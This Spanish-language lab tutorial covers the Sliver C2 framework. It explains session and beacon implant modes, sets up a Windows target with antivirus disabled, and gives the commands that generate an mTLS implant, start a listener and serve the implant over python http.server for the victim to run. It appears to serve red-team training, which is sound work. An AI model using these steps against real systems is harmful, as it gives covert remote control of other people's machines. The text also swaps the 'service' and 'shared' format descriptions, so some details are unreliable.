# Beacons y Sessiones

## Introducción

Esta entrada enseña a cómo utilizar los llamados <mark style="color:green;">**implantes**</mark> para controlar remotamente una máquina destino desde un servidor Sliver C2. Para familiarizarnos con los conceptos básicos de Sliver, se creará una máquina de destino (Windows) para elaborar diversos ataques. A continuación, veremos cómo entregar y utilizar un agente C2, que Sliver denomina "implante". Los implantes pueden operar en dos modos diferentes.

### Session mode

Si se utilizan en modo sesión, los implantes crean una <mark style="color:green;">**conexión de red permanente**</mark> entre el objetivo y el servidor C2. Este modo te permite escribir comandos y obtener respuesta inmediata, casi como si estuvieras en una sesión SSH o PowerShell Remoting. Esto resulta muy cómodo para trabajar, pero, por supuesto, este tipo de conexiones de larga duración pueden hacer que algún día se levanten el equipo azul sospeche.

### Beacon mode

Si se utilizan en modo beacon, los implantes crean <mark style="color:green;">**conexiones de red temporales**</mark> con el objetivo a intervalos regulares. Entre conexiones, los implantes entran en reposo. Si interactúas con una beacon, tus comandos no se ejecutarán inmediatamente. En su lugar, se pondrán en cola y se ejecutarán la próxima vez que el beacon se conecte. Esto es un poco menos conveniente, ya que tendrás que esperar a la respuesta, pero también puede parecer un poco menos sospechoso ante detecciones (dependiendo del entorno, por supuesto).



Sliver admite diferentes tipos de conexiones de red. Todas pueden utilizarse para beacon y session. Por ahora, sólo utilizaremos conexiones TLS mutuas (mTLS). En siguientes entradas exploraremos otros protocolos C2.

El gran plan para este post es simple: usar Sliver para generar implantes en modo beacon y en modo session, entregarlos al objetivo en forma de descarga web, y luego ejecutar los implantes e interactuar con ellos desde el servidor C2.

Para ello, son necesarios algunos preparativos. Tendrás que montar un laboratorio sencillo con un servidor C2 y una máquina objetivo.&#x20;

## Laboratorio

Esta primera sección trata sobre la preparación de la configuración del laboratorio. Asumo que has pasado antes por la parte de [<mark style="color:green;">**Instalación**</mark>](instalacion.md) y tienes una máquina virtual con Sliver instalado en ella. Esta máquina se llamará el servidor C2.

Lo que falta es el objetivo que queremos controlar con un agente C2. Dado que Windows es el sistema operativo (SO) más popular, vamos a configurar una VM Windows para ello.

Mi configuración personal para este post se ve como se muestra a continuación. He añadido mis IPs locales para que sea más fácil seguir los fragmentos de código. También se incluyen los puertos para los dos servicios de red. El servidor C2 servirá archivos con `python http.server` en el puerto 8000 y aceptará conexiones C2 en el puerto 8888.

{% code title="Esquema" overflow="wrap" %}
```
+-------------------+                         +-------------------+
|                   |         Download binary |                   |
|     C2 Server     +--8000 <-----------------+      Target       |
|      (Linux)      |                         |     (Windows)     |
|                   |         C2 Connection   |                   |
|    172.19.0.128   +--8888 <-----------------+    172.19.0.131   |
|                   |                         |                   |
+-------------------+                         +-------------------+
```
{% endcode %}

### Preparación del objetivo

Vaya a [<mark style="color:green;">**Microsoft Windows Evaluation Center**</mark>](https://www.microsoft.com/en-us/evalcenter) y descargue una copia de windows, en mi caso usaré una copia de Windows 10 Enterprice. Use esta imagen para crear su propia Windows WM.

Solo requiere una instalación básica, no se preocupe si tiene una versión diferente a la mostrada en  este blog. Después de la instalación, desactive el antivirus de windows, ya que en esta sección no se cubrirá la evasión de sistemas EDR o Antivirus. Puede hacerlo abriendo la GUI de windows “Virus & Threat Protection” y deshabilitar todas las protecciones. Debe quedar algo así:

<figure><img src="https://dominicbreuker.com/img/25_sliver_c2_beacons_and_sessions/av_off_gui.png" alt=""><figcaption></figcaption></figure>

## Generación de implante

Para generar un implante C2 con sliver, solo ocupe el comando `generate`. Si tiene dudas de todas las opciones que puede modificar utilice la ayuda con `generate --help`. A qui va una explicación de las banderas para generar un implante con mTLS:

* `--mtls 172.19.0.128`: Especifica el protocolo de comunicación que el implante usará en este caso TLS multiple. Otras banderas que se pueden utilizar son `--wg` para WireGuard, `--http` para HTTP(S) o `--dns` para DNS-based C2.
* `--os windows`: Especifica el sistema operativo objetivo el cual va a correr el implante, por defecto tiene windows y no es necesario especificarlo. MacOS Y Linux también son soportados.
* `--arch amd64`: Especifica que queremos un implante de 64 bits (también por defecto, puede omitirse). Utilice `--arch 386` para un implante de a 32-bit.
* `--format exe`: Especifica que queremos un archivo ejecutable (de nuevo por defecto). Otras opciones son , `--format service` para bibliotecas dinámicas,  `--format shared` para un binario de servicio de Windows (puede usarse con el comando `psexec`) y `shellcode` (sólo windows).
* `--save ~/Documents/sliverTest`: Especifica donde guardar el implante

{% code overflow="wrap" %}
```bash
generate --mtls 172.19.0.128 --os windows --arch amd64 --format exe --save ~/Documents/sliverTest/
```
{% endcode %}

Debe verse algo parecido a esto:

{% code overflow="wrap" %}
```bash
sliver > generate --mtls 172.19.0.128 --os windows --arch amd64 --format exe --save ~/Documents/sliverTest/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 37s
[*] Implant saved to /home/kali/Documents/sliverTest/GROSS_DRIVER.exe
```
{% endcode %}

Sliver generará un implante con nombre aleatorio si no se especifíca, en mi caso GROSS\_DRIVER.exe es el candidato.

### mTLS Listerner

Luego de generar el implante, se requiere levanta un mTLS listener, esto es muy simple, solo se tiene que ocupar el comando `mtls` y luego el comando `jobs` para lista los listeners y sobre que puerto corren:

```
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 2    mtls   tcp        8888                 
```

### Deliver and execute

Para la entrega (deliver) y ejecución del malware, se optó por el uso de `python -m http.server` en la carpeta donde el implante se encuentra, y luego en la mpaquina victima solo se tiene que descargar y ejecutar el implante.







